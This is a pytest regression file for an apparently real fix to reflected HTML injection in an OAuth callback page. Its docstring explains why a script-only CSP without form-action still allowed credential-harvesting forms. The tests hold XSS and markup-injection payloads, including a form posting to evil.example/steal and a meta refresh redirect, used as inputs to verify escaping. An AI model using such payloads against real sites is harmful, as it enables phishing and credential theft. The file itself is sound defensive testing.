"""The DA OAuth callback must not reflect attacker markup (3.17.3).

Found by the pre-release security review of `v3.5.0..HEAD`. `da_auth_callback`
renders an HTML page (a person is looking at the tab, not a fetch call) and fed
it straight from a **query parameter**:

```python
if error:
    return _page("Authorisation refused",
                 f"DeviantArt said: {error_description or error}", False)
```

`?error=x&error_description=<form action=https://evil/…>` therefore rendered
attacker markup on the PawPoller origin. Two things made it worse than a
typical reflected sink:

  * the refusal branch runs **before** the `state` check, so the single-use
    token gated nothing;
  * the same `_page` sink also takes remote response text and exception text.

**The CSP was not a fix.** `script-src 'self'` with no `unsafe-inline` stopped
script executing, and it is easy to stop there and call it contained. But CSP
had no `form-action`, and `form-action` does **not** inherit from `default-src`
— so an injected `<form method=post action="https://attacker/">` dressed as a
PawPoller login prompt, or a `<meta http-equiv=refresh>`, worked fine and needed
no script at all. A CSP that blocks script is not a CSP that blocks credential
theft.

Both halves are fixed and both are pinned here, because either alone leaves a
real attack.
"""
from __future__ import annotations

import pytest


# ── the sink escapes ─────────────────────────────────────────────

@pytest.fixture()
def client():
    from dashboard import app
    from fastapi.testclient import TestClient
    return TestClient(app)


_PAYLOAD = '<form action="https://evil.example/steal">'


def test_the_error_description_is_escaped_in_the_page(client):
    """The regression, end to end: markup in the query parameter must come
    back inert."""
    r = client.get("/api/da/auth/callback",
                   params={"error": "access_denied", "error_description": _PAYLOAD},
                   follow_redirects=False)
    body = r.text
    assert "<form" not in body.lower(), "attacker markup rendered as live HTML"
    assert "&lt;form" in body, "the text should still be shown, just escaped"


def test_the_bare_error_parameter_is_escaped_too(client):
    """`error_description or error` — the fallback reaches the same sink."""
    r = client.get("/api/da/auth/callback", params={"error": _PAYLOAD},
                   follow_redirects=False)
    assert "<form" not in r.text.lower()


@pytest.mark.parametrize("payload", [
    '<script>alert(1)</script>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '"><h1>spoofed',
    "<img src=x onerror=alert(1)>",
])
def test_no_payload_shape_survives_as_markup(client, payload):
    """The property is "the raw payload does not appear; the escaped form
    does" — not "the string `onerror=` is absent". `onerror=` sitting inside
    escaped text is inert, and asserting on substrings like that fails on
    correct output while still passing on some incorrect output."""
    from html import escape
    r = client.get("/api/da/auth/callback",
                   params={"error": "x", "error_description": payload},
                   follow_redirects=False)
    assert payload not in r.text, "payload reflected verbatim as live markup"
    assert escape(payload) in r.text, "payload should survive, escaped"


def test_the_page_still_reports_the_real_reason(client):
    """Escaping must not turn a useful message into a blank one — the page
    exists to tell a person what DeviantArt said."""
    r = client.get("/api/da/auth/callback",
                   params={"error": "access_denied",
                           "error_description": "You clicked Decline"},
                   follow_redirects=False)
    assert "You clicked Decline" in r.text
    assert r.status_code == 400


def test_a_missing_code_still_renders_its_own_message(client):
    r = client.get("/api/da/auth/callback", follow_redirects=False)
    assert "no code" in r.text.lower()


# ── the CSP half ─────────────────────────────────────────────────

def test_form_action_is_set_so_an_injected_form_cannot_post_out(client):
    """`form-action` has NO `default-src` fallback, so it must be named. Without
    it, escaping is the only thing standing between a future unescaped sink and
    a credential-harvesting form on the real origin."""
    csp = client.get("/api/health").headers.get("content-security-policy", "")
    assert "form-action 'self'" in csp, f"form-action missing from CSP: {csp}"


def test_the_directives_that_do_not_inherit_are_all_named(client):
    """object-src, base-uri and form-action share the property that
    `default-src` does not cover them. Naming two of three is the trap."""
    csp = client.get("/api/health").headers.get("content-security-policy", "")
    for directive in ("object-src", "base-uri", "form-action"):
        assert directive in csp, f"{directive} not named in CSP"


def test_every_csp_in_the_app_names_form_action():
    """There are THREE cached CSP builders — dashboard, share pages and the
    epub viewer. The share one serves PUBLIC pages, so fixing only the
    dashboard would leave the most exposed surface open. Asserted against the
    built strings, not the source, so a fourth builder that forgets is caught.
    """
    import dashboard
    for name in ("_build_csp", "_build_share_csp", "_build_epub_viewer_csp"):
        fn = getattr(dashboard, name, None)
        if fn is None:
            continue
        assert "form-action 'self'" in fn(), f"{name}() omits form-action"
